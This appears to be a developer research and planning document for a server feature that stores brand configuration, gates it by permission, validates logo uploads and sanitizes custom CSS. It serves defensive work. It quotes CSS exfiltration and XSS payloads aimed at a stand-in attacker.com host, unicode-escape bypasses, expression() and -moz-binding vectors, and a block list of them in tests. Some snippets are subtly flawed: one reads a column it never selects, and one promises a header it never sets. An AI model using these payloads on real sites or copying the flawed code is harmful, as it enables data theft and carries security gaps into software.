# Phase 81: Brand Config Server Foundation - Research

**Researched:** 2026-06-24
**Domain:** Server-side brand persistence, RBAC extension, file upload sanitization, CSS AST sanitization
**Confidence:** HIGH — all findings grounded in direct codebase inspection

---

## Summary

Phase 81 is a pure server phase (`packages/server`) that builds the persistence layer all downstream phases depend on. Everything it delivers is well-precedented in the existing codebase: the `brand_config` table mirrors `column_display_config` (v1.15); the `branding:manage` permission threads through three files using the same history-gated seed pattern as `dashboards:manage_access` (v1.10) and `app:manage_settings` (v1.15, pivoted to env vars but the pattern was designed); the four API routes follow the existing `requirePermission`-spread pattern; and the supertest fixtures (`buildTestApp` + `createAdminSession` + `vi.stubEnv("AUTH_MODE", ...)`) are established conventions.

The two open decisions from the research canon are resolved here: **PostCSS AST** for custom CSS sanitization (CONFIRMED — regex is definitively insufficient against unicode-escape CVE patterns per PITFALLS.md); **`file-type@19`** for magic-byte MIME validation (confirmed compatible with the server's ESM `"type": "module"` + Node 24.14.1 runtime — `file-type@19` is `type: module`, `engines: node>=18`). `file-type@22` (latest) requires Node ≥22 — we are on Node 24.14.1 so either works, but `file-type@19` is the documented locked version.

The key storage decision locked in STATE.md — a `config_json` blob field rather than individual columns per token — must be applied here. Custom CSS scoping (Open Decision 1) is deferred to Phase 83 (client injection); Phase 81 stores the raw (PostCSS-sanitized-at-write) CSS string, preserving whatever the server already stripped, for Phase 83 to scope at injection time.

**Primary recommendation:** Follow the `column_display_config` + `seedRbac` precedents exactly. Use PostCSS AST at PUT time for CSS sanitization. Use `file-type@19` for MIME magic-byte validation. Serve `GET /api/branding` with `Cache-Control: no-cache, no-store`.

---

<phase_requirements>
## Phase Requirements

| ID | Description | Research Support |
|----|-------------|-----------------|
| BRANDFND-01 | Server-side brand configuration store persists the active branding (color tokens light+dark, fonts, radius/density/glow, app name, logo reference, custom CSS) as a single global brand | `brand_config` singleton table with `config_json` TEXT blob + logo columns; `INSERT OR IGNORE (id=1)` seed in `createDb()` after SCHEMA_DDL |
| BRANDFND-02 | New permission gates branding management; reads unauthenticated; writes require permission; non-permitted returns 403 | `BRANDING_MANAGE: "branding:manage"` 18th permission; `GET /api/branding` mounted before `app.use("/api", requireAuth)` at line 530; PUT gated via `...requirePermission(PERMISSIONS.BRANDING_MANAGE)` |
| SECA-V116-01 | Logo/asset uploads validated (MIME + magic-byte type check, size limit) and SVGs sanitized; logos render as images (never inline-executed) | multer memoryStorage + 256 KB cap; `file-type@19` magic-byte check on buffer; DOMPurify (jsdom) SVG profile sanitization before storage |
| CSS-V116-02 | Injected CSS sanitized (server-side, AST-based) to neutralize exfiltration/XSS vectors; scoped so it cannot break app shell | PostCSS AST walk at PUT time; strip `url()`, `@import`, `@font-face`, `expression()`, `javascript:`, `behavior`, `-moz-binding`; Phase 83 handles client-side scoping — server stores sanitized string |
</phase_requirements>

---

## Standard Stack

### Core (server — packages/server)

| Library | Version | Purpose | Why Standard |
|---------|---------|---------|--------------|
| `better-sqlite3` | `^12.8.0` (already installed) | SQLite ORM — `brand_config` DDL, seed, CRUD | Existing singleton db; synchronous API; matches all existing table patterns |
| `multer` | `2.2.0` | Multipart logo upload | `memoryStorage()` → buffer → base64 → SQLite; v1.x deprecated; confirmed CJS, compatible with ESM server via `esModuleInterop: true` |
| `file-type` | `19.6.0` (latest v19) | Magic-byte MIME validation on upload buffer | ESM-native (`type: module`); `engines: node>=18`; works with server's `"type": "module"` without any CJS shim |
| `postcss` | `8.5.15` | CSS AST walk for custom CSS sanitization at save time | No `type` field → ships both CJS + ESM exports; parses CSS to AST for deterministic node-walk; ~8 KB; strips unicode-escape-bypassed attack vectors that regex misses |
| `dompurify` | `3.4.11` | SVG sanitization at logo upload | Ships `dist/purify.cjs.js` (CJS main) — compatible with ESM server via `esModuleInterop`; requires a DOM environment, use with `jsdom` |
| `jsdom` | `29.1.1` | DOM environment for server-side DOMPurify | CommonJS, `engines: node>=18`; only needed for SVG sanitization at upload — instantiate a JSDOM window and pass it to DOMPurify |

### Not installed (must add to packages/server/package.json)

```bash
# Install in packages/server
npm install multer file-type@19 postcss dompurify jsdom
npm install -D @types/multer @types/dompurify @types/jsdom
```

Note: `@types/multer` was listed as a prod dep in existing server package.json. It should be a `devDependency`.

### ESM / CJS Compatibility Matrix

The server's `package.json` has `"type": "module"` and `tsconfig.json` has `"module": "ESNext"`. All imports use ES module syntax.

| Package | Module Format | Import Approach | Risk |
|---------|--------------|-----------------|------|
| `multer@2.2.0` | CJS (no `type` field) | `import multer from "multer"` — works via `esModuleInterop: true` | LOW — proven CJS interop pattern in this server |
| `file-type@19` | ESM (`"type": "module"`) | `import { fileTypeFromBuffer } from "file-type"` | NONE — native ESM aligns with server |
| `postcss@8` | Dual (CJS + ESM exports) | `import postcss from "postcss"` | NONE |
| `dompurify@3.4` | CJS main (`dist/purify.cjs.js`) | `import DOMPurify from "dompurify"` + jsdom window | LOW — same `esModuleInterop` path as multer; needs explicit Window setup |
| `jsdom@29` | CJS | `import { JSDOM } from "jsdom"` | LOW — CJS interop |

**CRITICAL flag:** `file-type@22` (latest) requires `node>=22` — fine on Node 24 — but `file-type@19` is the version locked in the milestone research. Either works on Node 24.14.1. Using `file-type@19` as specified.

---

## Architecture Patterns

### Existing Pattern: `column_display_config` Table (v1.15 precedent — db.ts lines 229-243)

```typescript
// db.ts SCHEMA_DDL — exact format to mirror for brand_config
CREATE TABLE IF NOT EXISTS column_display_config (
  table_id INTEGER NOT NULL,
  column_name TEXT NOT NULL,
  label TEXT,
  format_spec TEXT,  -- JSON-encoded blob, TEXT column
  created_at TEXT NOT NULL DEFAULT (datetime('now')),
  updated_at TEXT NOT NULL DEFAULT (datetime('now')),
  PRIMARY KEY (table_id, column_name)
);
```

Key pattern notes:
- `CREATE TABLE IF NOT EXISTS` — covers both fresh installs and upgrades
- JSON-encoded data stored as `TEXT`, not separate columns
- `datetime('now')` for timestamps
- No `REFERENCES` FK constraint for soft FK (same as `dashboard_layers.table_id`)

### brand_config Table DDL (exact, matching house style)

```sql
-- v1.16 Phase 81 (BRANDFND-01): global singleton brand configuration.
-- Single row enforced by CHECK(id = 1) + INSERT OR IGNORE seed. Follows
-- column_display_config (v1.15) JSON-blob pattern: config_json holds
-- the full BrandConfig object (token overrides, font, app name, custom CSS)
-- so token additions do not require schema migrations. Logo is stored as a
-- separate base64 TEXT column (binary would be BLOB; TEXT base64 is simpler
-- with better-sqlite3 round-trips and stays consistent with the JSON-blob
-- approach). CREATE TABLE IF NOT EXISTS covers fresh + existing deployments.
CREATE TABLE IF NOT EXISTS brand_config (
  id          INTEGER PRIMARY KEY CHECK(id = 1),
  config_json TEXT NOT NULL DEFAULT '{}',
  logo_data   TEXT,
  logo_mime   TEXT,
  logo_updated_at TEXT,
  updated_at  TEXT NOT NULL DEFAULT (datetime('now')),
  updated_by  TEXT
);
```

Boot seed (added at the END of `createDb()`, after `seedRbac(instance)`, before `return instance`):

```typescript
// v1.16 Phase 81 (BRANDFND-01): seed singleton brand_config row.
// INSERT OR IGNORE — no-op on all subsequent boots; first boot inserts defaults.
instance.exec("INSERT OR IGNORE INTO brand_config (id) VALUES (1)");
```

### Existing Pattern: `requirePermission` Spread (rbac.ts + index.ts)

From `packages/server/src/rbac.ts` (lines 44-72): `requirePermission` returns a two-element `RequestHandler[]`. It is always spread into the route definition:

```typescript
// Exact pattern from index.ts line 542
app.post("/api/dashboards", ...requirePermission(PERMISSIONS.DASHBOARDS_CREATE), (req, res) => {
```

For the branding PUT:
```typescript
app.put("/api/branding", ...requirePermission(PERMISSIONS.BRANDING_MANAGE), (req, res) => {
```

For the unauthenticated GET — mount it BEFORE `app.use("/api", requireAuth)` (line 530), mirroring `GET /api/auth/config` (line 378):

```typescript
// Phase 81: unauthenticated brand config — mounted BEFORE app.use("/api", requireAuth) at line 530
// so the login page can fetch brand without a session cookie.
app.get("/api/branding", (_req, res) => {
  res.setHeader("Cache-Control", "no-cache, no-store");
  // ...
});
```

### Existing Pattern: Cache-Control Headers (index.ts)

Two precedents:
- `GET /api/auth/config` (line 379): `res.setHeader("Cache-Control", "no-store")` — for frequently-mutated config
- `GET /api/wms/capabilities` (line 2215): `res.setHeader("Cache-Control", "private, max-age=300")` — for stable config

`GET /api/branding` must use `"no-cache, no-store"` per the success criteria (reverse-proxy safety). Both `no-cache` AND `no-store` together — `no-store` prevents caching the response body; `no-cache` forces revalidation even if a proxy ignores `no-store`.

For `GET /api/branding/logo` (public, cache-busted): `"public, max-age=31536000, immutable"` with the `?v=<logo_updated_at>` timestamp as the cache-bust key.

### Existing Pattern: Permission Threading (3 files)

The v1.10 `dashboards:manage_access` pattern is the exact model. Here is how it was added:

**File 1 — `packages/server/src/lib/permissions.ts`:**
- Added `DASHBOARDS_MANAGE_ACCESS: "dashboards:manage_access"` to the `PERMISSIONS` object (line 23)
- Added it to `DEFAULT_ROLE_MAPPINGS.admin` (already `[...ALL_PERMISSIONS]` — automatic)
- Added it to `DEFAULT_ROLE_MAPPINGS.designer` (explicit list at lines 71-82)

**File 2 — `packages/server/src/lib/rbacSeed.ts`:**
- No changes needed here. The seed function iterates `DEFAULT_ROLE_MAPPINGS` from `permissions.ts`. Adding the permission to that object automatically seeds it via the history-gated mechanism.

**File 3 — `packages/web/src/lib/permissions.ts`:**
- Mirror: added `DASHBOARDS_MANAGE_ACCESS: "dashboards:manage_access"` (line 27, currently last)
- Note: the web file uses the same key name but has NO `DEFAULT_ROLE_MAPPINGS` — web is lookup-only

**For `BRANDING_MANAGE`, the exact checklist:**

1. `packages/server/src/lib/permissions.ts`:
   - Add `BRANDING_MANAGE: "branding:manage"` to `PERMISSIONS` const (becomes 18th entry)
   - `ALL_PERMISSIONS` derives from `Object.values(PERMISSIONS)` — automatic inclusion
   - `DEFAULT_ROLE_MAPPINGS.admin` already uses `[...ALL_PERMISSIONS]` — automatic
   - `DEFAULT_ROLE_MAPPINGS.designer`: do NOT add (branding is operator-level, not designer-level — per ARCHITECTURE.md)
   - `DEFAULT_ROLE_MAPPINGS.user_admin`: do NOT add
   - `DEFAULT_ROLE_MAPPINGS.analyst`: do NOT add

2. `packages/server/src/lib/rbacSeed.ts`: no changes — it iterates `DEFAULT_ROLE_MAPPINGS` automatically

3. `packages/web/src/lib/permissions.ts`:
   - Add `BRANDING_MANAGE: "branding:manage"` as the 18th entry (after `DASHBOARDS_MANAGE_ACCESS`)
   - BYTE-PARITY comment says values must match server exactly — verify the string matches

---

## The 4 API Routes

### Route 1: `GET /api/branding` (unauthenticated)

```typescript
// Mount BEFORE app.use("/api", requireAuth) — line 530 is the requireAuth wall
app.get("/api/branding", (_req, res) => {
  res.setHeader("Cache-Control", "no-cache, no-store");
  const row = db.prepare("SELECT config_json, logo_mime, logo_updated_at, updated_at, updated_by FROM brand_config WHERE id = 1").get() as BrandConfigRow | undefined;
  if (!row) return res.json({ config: {}, logoUrl: null, updatedAt: null });
  const config = JSON.parse(row.config_json || "{}");
  const logoUrl = row.logo_data_exists && row.logo_updated_at
    ? `/api/branding/logo?v=${encodeURIComponent(row.logo_updated_at)}`
    : null;
  return res.json({ config, logoUrl, updatedAt: row.updated_at });
});
```

Response shape (wire contract for Phase 82 client):
```typescript
type BrandingGetResponse = {
  config: BrandConfigJson;  // token overrides, font, appName, customCss
  logoUrl: string | null;   // null if no logo uploaded
  updatedAt: string | null;
};
```

Note: do NOT include `logo_data` (base64 binary) in this response — it would bloat the bootstrap payload. The logo is served via its own route. `customCss` IS included in `config_json` (Phase 83 needs to read it to display it in the editor; Phase 82 applies it).

### Route 2: `PUT /api/branding` (branding:manage gated)

```typescript
app.put("/api/branding", ...requirePermission(PERMISSIONS.BRANDING_MANAGE), (req, res) => {
  const { config } = req.body as { config?: unknown };
  if (!config || typeof config !== "object") return res.status(400).json({ error: "config object required" });
  // Sanitize customCss if present
  const configObj = config as Record<string, unknown>;
  if (typeof configObj.customCss === "string") {
    configObj.customCss = sanitizeCssPostcss(configObj.customCss);
  }
  const username = (req as AuthedRequest).user!.creds.username;
  db.prepare(
    "UPDATE brand_config SET config_json = ?, updated_at = datetime('now'), updated_by = ? WHERE id = 1"
  ).run(JSON.stringify(configObj), username);
  const row = db.prepare("SELECT config_json, logo_updated_at, updated_at FROM brand_config WHERE id = 1").get() as BrandConfigRow;
  return res.json({ config: JSON.parse(row.config_json), updatedAt: row.updated_at });
});
```

### Route 3: `POST /api/branding/logo` (branding:manage gated, multer)

```typescript
import multer from "multer";
import { fileTypeFromBuffer } from "file-type";
import { JSDOM } from "jsdom";
import DOMPurify from "dompurify";

const logoUpload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 256 * 1024 }, // 256 KB hard cap
});

const ALLOWED_LOGO_MIMES = new Set(["image/png", "image/jpeg", "image/svg+xml", "image/webp"]);

app.post(
  "/api/branding/logo",
  ...requirePermission(PERMISSIONS.BRANDING_MANAGE),
  logoUpload.single("logo"),
  async (req, res) => {
    if (!req.file) return res.status(400).json({ error: "logo file required" });
    // Magic-byte MIME validation — do NOT trust req.file.mimetype (client-supplied)
    const detected = await fileTypeFromBuffer(req.file.buffer);
    const mime = detected?.mime ?? req.file.mimetype;
    if (!ALLOWED_LOGO_MIMES.has(mime)) {
      return res.status(400).json({ error: `Unsupported file type: ${mime}` });
    }
    let logoData = req.file.buffer.toString("base64");
    // SVG: sanitize with DOMPurify before storage
    if (mime === "image/svg+xml") {
      const svgString = req.file.buffer.toString("utf-8");
      const dom = new JSDOM("", { contentType: "text/html" });
      const purify = DOMPurify(dom.window);
      const clean = purify.sanitize(svgString, {
        USE_PROFILES: { svg: true, svgFilters: true },
        FORBID_TAGS: ["script", "use"],
        FORBID_ATTR: ["onload", "onclick", "onerror"],
      });
      logoData = Buffer.from(clean).toString("base64");
    }
    const username = (req as AuthedRequest).user!.creds.username;
    const ts = new Date().toISOString();
    db.prepare(
      "UPDATE brand_config SET logo_data = ?, logo_mime = ?, logo_updated_at = ?, updated_at = datetime('now'), updated_by = ? WHERE id = 1"
    ).run(logoData, mime, ts, username);
    const logoUrl = `/api/branding/logo?v=${encodeURIComponent(ts)}`;
    return res.json({ logoUrl });
  }
);
```

### Route 4: `GET /api/branding/logo` (public, cache-busted)

```typescript
// Mount BEFORE app.use("/api", requireAuth) — public, no auth required
app.get("/api/branding/logo", (_req, res) => {
  const row = db.prepare("SELECT logo_data, logo_mime FROM brand_config WHERE id = 1").get() as { logo_data: string | null; logo_mime: string | null } | undefined;
  if (!row?.logo_data || !row.logo_mime) return res.status(404).end();
  const buf = Buffer.from(row.logo_data, "base64");
  // Immutable + cache-busted by ?v= timestamp parameter
  res.setHeader("Cache-Control", "public, max-age=31536000, immutable");
  res.setHeader("Content-Type", row.logo_mime);
  // Serve SVGs with content-disposition attachment + nosniff to prevent script execution
  // if accessed directly (as opposed to via <img> tag)
  res.setHeader("X-Content-Type-Options", "nosniff");
  return res.send(buf);
});
```

---

## Don't Hand-Roll

| Problem | Don't Build | Use Instead | Why |
|---------|-------------|-------------|-----|
| MIME magic-byte validation | File extension check or trust `req.file.mimetype` | `file-type@19` `fileTypeFromBuffer()` | Attacker controls Content-Type header; extension is trivially spoofed; magic bytes are in the file itself |
| SVG XSS sanitization | Regex stripping `<script>` tags | DOMPurify (SVG profile) + jsdom | SVGs have dozens of XSS vectors beyond `<script>`: `<use href="...">`, `onload` on any element, `javascript:` href — DOMPurify handles them all |
| CSS sanitization | Regex patterns like `/url\s*\(/gi` | PostCSS AST walk | Regex is definitively bypassed by unicode escapes (e.g. `u\72l(`, `\000075rl(`) — see PITFALLS.md CVE-2026-2441 confirmation |
| Multipart upload parsing | Manual `Content-Type: multipart/form-data` parsing | `multer@2.2.0` with `memoryStorage()` | Boundary parsing is non-trivial; multer is battle-tested; `memoryStorage` avoids disk I/O for small files |

---

## CSS Sanitization: Firm Recommendation (PostCSS AST)

### Why Regex Fails

PITFALLS.md documents confirmed CVE patterns that bypass regex:

```
u\72l(https://attacker.com)          → matches 'url()' after CSS unicode-escape resolution
\000075rl(https://attacker.com)      → same, different encoding
url ( https://attacker.com )         → spaces inside url() are valid CSS
url('javascript:...')                → nested quote forms
e\78pression(...)                    → expression() bypass
```

A naive `/url\s*\(/gi` pattern fails on `u\72l(` because regex operates on the raw string before CSS unicode-escape resolution. PostCSS resolves unicode escapes during parsing, so the AST walker sees the canonical form regardless of how the attacker encoded it.

### PostCSS AST Walk — Exact Implementation

```typescript
// packages/server/src/lib/brandCssSanitizer.ts (NEW)
import postcss from "postcss";

// Declarations whose values must not contain these functions/urls:
const BLOCKED_VALUE_PATTERNS = [
  /\burl\s*\(/i,          // url() — exfiltration via background-image etc.
  /\bexpression\s*\(/i,   // IE expression() — JS execution in legacy browsers
  /\bjavascript\s*:/i,    // javascript: pseudo-protocol
  /\bbehavior\s*:/i,      // IE behavior property
  /-moz-binding\s*:/i,    // Gecko -moz-binding: url() XSS
];

// At-rules that must be removed entirely:
const BLOCKED_AT_RULES = new Set([
  "import",   // @import — loads attacker-controlled stylesheet
  "charset",  // @charset — can affect encoding of subsequent rules
  "font-face", // @font-face — can load fonts from attacker URLs
  "namespace", // @namespace — rarely legitimate in custom CSS
]);

/**
 * Sanitize custom CSS using PostCSS AST.
 * Runs at PUT /api/branding save time.
 * Returns the sanitized CSS string.
 */
export function sanitizeCssPostcss(raw: string): string {
  if (!raw || typeof raw !== "string") return "";
  // Cap input size to prevent DoS
  const capped = raw.slice(0, 65_536); // 64 KB cap
  try {
    const root = postcss.parse(capped);

    root.walk((node) => {
      if (node.type === "atrule") {
        if (BLOCKED_AT_RULES.has(node.name.toLowerCase())) {
          node.remove();
          return;
        }
      }
      if (node.type === "decl") {
        const val = node.value ?? "";
        for (const pattern of BLOCKED_VALUE_PATTERNS) {
          if (pattern.test(val)) {
            node.remove();
            break;
          }
        }
        // Also strip the property name 'behavior' entirely (IE)
        if (/^-*behavior$/i.test(node.prop)) {
          node.remove();
        }
      }
    });

    return root.toString();
  } catch {
    // PostCSS parse error — input is not valid CSS; return empty string
    return "";
  }
}
```

**What this strips:**
- `background-image: url(https://attacker.com?x=1)` — `url()` in declaration value
- `@import url("https://attacker.com/evil.css")` — `@import` at-rule
- `@font-face { src: url(...) }` — entire `@font-face` block
- `color: expression(alert(1))` — `expression()` in declaration value
- `-moz-binding: url(data:text/xml;...)` — Mozilla binding XSS
- `behavior: url(evil.htc)` — IE behavior

**What this preserves (legitimate custom CSS):**
- `button { letter-spacing: 0.05em }` — preserved
- `h1 { font-size: 1.5rem }` — preserved
- `.my-class { color: var(--accent) }` — preserved
- `@keyframes spin { from { transform: rotate(0deg) } }` — preserved (`@keyframes` is not in BLOCKED_AT_RULES)
- `@media (max-width: 768px) { ... }` — preserved

**Phase 83 note:** The server stores the PostCSS-sanitized string. Phase 83 (client) applies `@scope (#root) { ... }` wrapping at injection time via `BrandStyleInjector.tsx`. This is the correct separation: server removes exfiltration vectors; client handles blast-radius limiting. Phase 81 has no opinion on `@scope` — it just stores what PostCSS produces.

---

## Common Pitfalls

### Pitfall 1: `GET /api/branding` mounted AFTER `app.use("/api", requireAuth)`
**What goes wrong:** The login page cannot fetch brand config; returns 401.
**Root cause:** `app.use("/api", requireAuth)` at index.ts line 530 gates ALL `/api` routes below it.
**Prevention:** Mount `GET /api/branding` and `GET /api/branding/logo` before line 530, with explicit comment mirroring the `GET /api/auth/config` comment at line 376.

### Pitfall 2: Trusting `req.file.mimetype` for SVG detection
**What goes wrong:** Attacker sends `Content-Type: image/png` header with SVG body containing `<script>`. MIME check passes; script stored unstripped.
**Prevention:** Always call `fileTypeFromBuffer(req.file.buffer)` and use the detected MIME, not the client-supplied one. If `file-type` cannot detect (returns `undefined`) fall through to client-supplied MIME as a secondary guess — but still run DOMPurify for any SVG.

### Pitfall 3: DOMPurify without a DOM environment
**What goes wrong:** `DOMPurify.sanitize(...)` throws `TypeError: Cannot read properties of undefined (reading 'createHTMLDocument')` — there is no `window` in Node.
**Prevention:** Create a `JSDOM` window instance and pass it to `DOMPurify(dom.window)`. Instantiate once as a module-level singleton (not per-request) to avoid jsdom startup overhead.

### Pitfall 4: `config_json` migration for existing deployments
**What goes wrong:** The `CREATE TABLE IF NOT EXISTS` does not ALTER an existing table. If v1.15 somehow had a partial table, rows are missing the new column.
**Prevention:** `brand_config` is a NEW table (does not exist pre-v1.16). `CREATE TABLE IF NOT EXISTS` is sufficient — no PRAGMA-guarded ALTER needed. But the `INSERT OR IGNORE (id) VALUES (1)` seed IS required every boot.

### Pitfall 5: Custom CSS size cap missing
**What goes wrong:** Admin pastes a 5 MB CSS file; PostCSS takes seconds to parse.
**Prevention:** Cap at 64 KB in the route handler before calling `sanitizeCssPostcss()`. PostCSS parses 64 KB in under 10 ms per PITFALLS.md.

### Pitfall 6: Missing `updated_by` column in seed + queries
**What goes wrong:** TypeScript or SQLite throws because `updated_by` is TEXT nullable but the INSERT OR IGNORE seed omits it.
**Prevention:** The seed is `INSERT OR IGNORE INTO brand_config (id) VALUES (1)` — `updated_by` has no DEFAULT, so it is NULL on seed row. That is correct; it is updated to the username on every PUT/logo-upload.

---

## Test Strategy

### Test Infrastructure (confirmed from codebase)

- Framework: `vitest@4.1.5`, supertest via `buildTestApp()` helper at `tests/helpers/app.ts`
- `buildTestApp()`: `await createApp()` + `request(app)` — async because OIDC mode does discovery at boot
- In-memory DB: `process.env.DB_PATH = ":memory:"` in `tests/setup.ts` — each spec file gets isolated state
- Admin session: `createAdminSession()` in `tests/helpers/db.ts` — uses `APP_ADMIN_USERNAME` bootstrap short-circuit (all permissions)
- Analyst session: manual `createSession()` + `jwt.sign()` with no `user_roles` row → analyst fallback
- `beforeEach`: `db.exec("DELETE FROM sessions")` + delete any seeded test data

### Both Auth Modes Pattern (from routes.dynamic-view-drop.spec.ts)

```typescript
// AUTH_MODE=password block
describe("GET /api/branding — AUTH_MODE=password", () => {
  beforeEach(() => { vi.stubEnv("AUTH_MODE", "password"); });
  afterEach(() => { vi.unstubAllEnvs(); });
  // tests...
});

// AUTH_MODE=oidc smoke block
describe("GET /api/branding — AUTH_MODE=oidc smoke", () => {
  beforeEach(() => {
    vi.stubEnv("AUTH_MODE", "oidc");
    vi.stubEnv("AUTH_OIDC_ISSUER_URL", "https://idp.example.com");
    vi.stubEnv("AUTH_OIDC_CLIENT_ID", "kinetica-bi");
    vi.stubEnv("AUTH_OIDC_CLIENT_SECRET", "secret");
    vi.stubEnv("AUTH_OIDC_REDIRECT_URI", "https://bi.example.com/api/auth/oidc/callback");
    // Hoist openid-client mock so OIDC boot does not hit the network
  });
  afterEach(() => { vi.unstubAllEnvs(); });
  // smoke test — session cookie still works via JWT
});
```

### Spec File: `tests/routes.branding.spec.ts`

Required test cases for Phase 81 success criteria:

| Test | Auth Mode | Asserts |
|------|-----------|---------|
| `GET /api/branding` with no cookie | password | 200 + `{ config, logoUrl: null }` (unauthenticated) |
| `GET /api/branding` has `Cache-Control: no-cache, no-store` | password | `res.headers['cache-control']` matches |
| `PUT /api/branding` without session | password | 401 |
| `PUT /api/branding` with analyst session | password | 403 + `code: "PERMISSION_DENIED"` |
| `PUT /api/branding` with admin session + valid body | password | 200; subsequent GET reflects change |
| `PUT /api/branding` with `customCss: "background: url(https://attacker.com)"` | password | 200; stored `customCss` does NOT contain `url(https://attacker.com)` |
| `PUT /api/branding` with `customCss: "@import url(evil.css)"` | password | 200; stored CSS has `@import` stripped |
| `POST /api/branding/logo` without session | password | 401 |
| `POST /api/branding/logo` with analyst session | password | 403 |
| `POST /api/branding/logo` with admin + valid PNG | password | 200 + `{ logoUrl }` |
| `POST /api/branding/logo` with file > 256 KB | password | 413 (multer size limit) |
| `GET /api/branding/logo` with no logo stored | password | 404 |
| `GET /api/branding/logo` after upload | password | 200 + correct Content-Type |
| `GET /api/branding/logo` has immutable cache header | password | `res.headers['cache-control']` includes `immutable` |
| `GET /api/branding` returns 200 (smoke) | oidc | 200 even with OIDC mode — unauthenticated GET |

**SET-BASED gate:** Do NOT assert a fixed total pass-count. Failing files must be ⊆ TD-V16-TEST-ISOLATION (existing known-flaky set). The new `routes.branding.spec.ts` must be green (0 failures) and is NOT in TD-V16-TEST-ISOLATION.

### SVG Sanitization Test Approach

Because `fileTypeFromBuffer` and `DOMPurify` are real library calls, test the sanitization logic in a focused unit spec `tests/lib.brandCssSanitizer.spec.ts` without supertest overhead:

```typescript
import { sanitizeCssPostcss } from "../src/lib/brandCssSanitizer";

it("strips url() declarations", () => {
  const result = sanitizeCssPostcss("body { background: url(https://attacker.com?x=1) }");
  expect(result).not.toContain("url(");
});

it("strips @import", () => {
  const result = sanitizeCssPostcss("@import url('evil.css'); body { color: red; }");
  expect(result).not.toContain("@import");
  expect(result).toContain("color: red"); // legitimate rule preserved
});

it("strips expression()", () => {
  const result = sanitizeCssPostcss("div { width: expression(alert(1)) }");
  expect(result).not.toContain("expression(");
});

it("preserves legitimate CSS", () => {
  const result = sanitizeCssPostcss("button { letter-spacing: 0.05em; color: var(--accent); }");
  expect(result).toContain("letter-spacing");
  expect(result).toContain("var(--accent)");
});
```

SVG sanitization integration test in `routes.branding.spec.ts` must use a real SVG buffer with `<script>` and assert the stored `logo_data` base64-decodes to a string without `<script>`.

---

## Dependency Versions (Verified Against npm Registry 2026-06-24)

| Package | Locked Version | Current Latest | Node Compat | Module Format | Notes |
|---------|---------------|----------------|-------------|---------------|-------|
| `multer` | `2.2.0` | `2.2.0` | `>=10.16.0` | CJS | `esModuleInterop: true` allows ESM import |
| `file-type` | `19.6.0` | `22.0.1` | `>=18` (v19) | ESM | v22 requires `node>=22` — v19 is safer; both work on Node 24 |
| `postcss` | `8.5.15` | `8.5.15` | any | dual (CJS+ESM exports) | No issues |
| `dompurify` | `3.4.11` | `3.4.11` | any | CJS main | Needs jsdom for Node environment |
| `jsdom` | `29.1.1` | `29.1.1` | `>=18` | CJS | Canvas optional peer dep — skip it |

**ESM flag:** `file-type@17+` is ESM-only. The server has `"type": "module"` in its `package.json`, so this is NOT a problem — native ESM import works directly. The flag from the research brief is resolved: no shim needed.

---

## Validation Architecture

### Test Framework
| Property | Value |
|----------|-------|
| Framework | vitest@4.1.5 |
| Config file | `packages/server/vitest.config.ts` |
| Setup file | `packages/server/tests/setup.ts` (sets env, DB_PATH=:memory:) |
| Quick run command | `npm run test:server -- --run tests/routes.branding.spec.ts` |
| Full suite command | `npm run test:server -- --run` |

### Phase Requirements → Test Map
| Req ID | Behavior | Test Type | Automated Command | File Exists? |
|--------|----------|-----------|-------------------|-------------|
| BRANDFND-01 | `brand_config` table DDL + seed + GET returns config | integration (supertest) | `npm run test:server -- --run tests/routes.branding.spec.ts` | ❌ Wave 0 |
| BRANDFND-02 | Permission gates: 403 without `branding:manage`, 200/204 with it | integration (supertest) | same | ❌ Wave 0 |
| SECA-V116-01 | Logo MIME validation + SVG DOMPurify sanitization | integration + unit | `npm run test:server -- --run tests/routes.branding.spec.ts` | ❌ Wave 0 |
| CSS-V116-02 | PostCSS strips `url()`, `@import`, `expression()` at save time | unit | `npm run test:server -- --run tests/lib.brandCssSanitizer.spec.ts` | ❌ Wave 0 |

### Sampling Rate
- **Per task commit:** `npm run test:server -- --run tests/routes.branding.spec.ts tests/lib.brandCssSanitizer.spec.ts`
- **Per wave merge:** `npm run test:server -- --run` (full suite, SET-BASED gate)
- **Phase gate:** Full suite SET-BASED green + `tsc --noEmit` clean before verification

### Wave 0 Gaps
- [ ] `tests/routes.branding.spec.ts` — covers BRANDFND-01, BRANDFND-02, SECA-V116-01
- [ ] `tests/lib.brandCssSanitizer.spec.ts` — covers CSS-V116-02 (unit, fast)
- [ ] `packages/server/src/lib/brandCssSanitizer.ts` — PostCSS sanitizer implementation

---

## Recommended Plan Breakdown

### Plan 81-01: `brand_config` DDL + Permission (BRANDFND-01 partial, BRANDFND-02 partial)

**Scope:** Pure schema + permission wiring. No routes yet.

Wave 1 (all tasks independent):
- `db.ts`: Add `brand_config` DDL to `SCHEMA_DDL` (after `column_display_config`) + `INSERT OR IGNORE INTO brand_config (id) VALUES (1)` seed after `seedRbac(instance)`
- `packages/server/src/lib/permissions.ts`: Add `BRANDING_MANAGE: "branding:manage"` as 18th entry
- `packages/web/src/lib/permissions.ts`: Mirror same constant as 18th entry
- `rbacSeed.ts`: No changes needed (automatic via `DEFAULT_ROLE_MAPPINGS`)

Wave 2: `tests/lib.permissions.spec.ts` update (if it checks ALL_PERMISSIONS count — verify existing spec at `tests/lib.permissions.spec.ts`) + confirm `tsc` clean on both packages

**Gate:** `tsc --noEmit` clean on server + web; `npm run test:server -- --run tests/lib.permissions.spec.ts`

### Plan 81-02: Branding API Routes (all 4 routes) + multer + file-type (BRANDFND-01, BRANDFND-02, SECA-V116-01 partial)

**Scope:** All four Express routes + dependency install + logo sanitization.

Wave 1:
- Install deps: `multer@2.2.0`, `file-type@19`, `dompurify@3.4.11`, `jsdom@29` in `packages/server`
- `index.ts`: Add `GET /api/branding` (unauthenticated, no-cache header, before requireAuth wall)
- `index.ts`: Add `GET /api/branding/logo` (unauthenticated, immutable cache, before requireAuth wall)
- `index.ts`: Add `PUT /api/branding` (`requirePermission(BRANDING_MANAGE)`) — stores raw config_json for now (CSS sanitizer in Plan 81-03)
- `index.ts`: Add `POST /api/branding/logo` (multer + file-type + DOMPurify SVG sanitization)

Wave 2 (depends on Wave 1 routes existing):
- `tests/routes.branding.spec.ts`: auth tests (200 no-cookie GET, 403 analyst PUT, 200 admin PUT, 401 no-cookie PUT, logo upload tests, 404 no-logo GET, cache header assertions)

**Gate:** All routes.branding.spec.ts tests green; `tsc` clean

### Plan 81-03: CSS Sanitization at Save + Full Supertest Coverage (CSS-V116-02, SECA-V116-01 complete)

